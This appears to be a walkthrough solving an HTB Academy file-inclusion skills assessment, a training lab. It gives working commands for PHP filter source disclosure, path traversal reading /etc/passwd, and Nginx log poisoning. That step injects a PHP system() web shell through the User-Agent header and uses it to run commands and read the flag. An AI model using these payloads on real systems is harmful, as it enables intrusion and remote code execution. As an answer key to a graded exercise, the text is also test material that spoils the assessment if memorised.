# Skills Assessment Walkthrough - HTB Academy Guide

## HTB Academy Skills Assessment - File Inclusion

> Complete walkthrough of the capstone challenge that combines multiple LFI techniques for RCE and flag extraction.

**Challenge:** "Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system."

---

## Multi-Technique Exploitation Chain

### Phase 1: Source Code Disclosure
```bash
# Step 1: Discover vulnerable parameter
http://TARGET_IP:PORT/index.php?page=about

# Step 2: PHP filter source disclosure
http://TARGET_IP:PORT/index.php?page=php://filter/convert.base64-encode/resource=index

# Step 3: Decode and analyze source
echo 'BASE64_OUTPUT' | base64 -d | grep -i admin
# Reveals: // echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
```

### Phase 2: Admin Panel Discovery
```bash
# Step 4: Read admin panel source
http://TARGET_IP:PORT/index.php?page=php://filter/convert.base64-encode/resource=ilf_admin/index

# Step 5: Identify LFI in admin panel
# Vulnerable code found:
# $log = "logs/" . $_GET['log'];
# include $log;
```

### Phase 3: LFI Exploitation
```bash
# Step 6: Test admin panel LFI
http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../etc/passwd

# Step 7: Identify web server (Nginx)
http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log
```

### Phase 4: Log Poisoning & RCE
```bash
# Step 8: Poison User-Agent header
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
     "http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log"

# Step 9: Execute commands
http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls /

# Step 10: Find and read flag
http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat /flag_*
```

---

## Techniques Demonstrated

1. **PHP Filter Source Disclosure** - Reading application source code
2. **Hidden Functionality Discovery** - Finding commented admin panels
3. **Path Traversal & LFI** - Basic file inclusion exploitation
4. **Web Server Identification** - Testing different log locations
5. **Log Poisoning** - User-Agent header injection
6. **Remote Code Execution** - Command execution via poisoned logs

---

## Complete Attack Commands

```bash
# 1. Source disclosure
curl "http://TARGET_IP:PORT/index.php?page=php://filter/convert.base64-encode/resource=index"

# 2. Admin panel discovery
echo 'BASE64_OUTPUT' | base64 -d | grep -i admin

# 3. Admin source disclosure
curl "http://TARGET_IP:PORT/index.php?page=php://filter/convert.base64-encode/resource=ilf_admin/index"

# 4. LFI testing
curl "http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../etc/passwd"

# 5. Log poisoning
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
     "http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log"

# 6. RCE and flag extraction
curl "http://TARGET_IP:PORT/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat /flag_*"
```

---

## Expected Flag Format

**Flag:** `HTB{example_flag_here}` or similar format  
**Location:** `/flag_[random].txt` in root directory

---

## Alternative Approaches

If primary method fails, try:

1. **SSH Log Poisoning** - If SSH is available
2. **PHP Session Poisoning** - If sessions are accessible  
3. **Data Wrapper RCE** - If `allow_url_include=On`
4. **Different Log Locations** - Apache logs, mail logs, etc.

---

*This walkthrough demonstrates the complete HTB Academy Skills Assessment solution, showcasing advanced file inclusion exploitation techniques.* 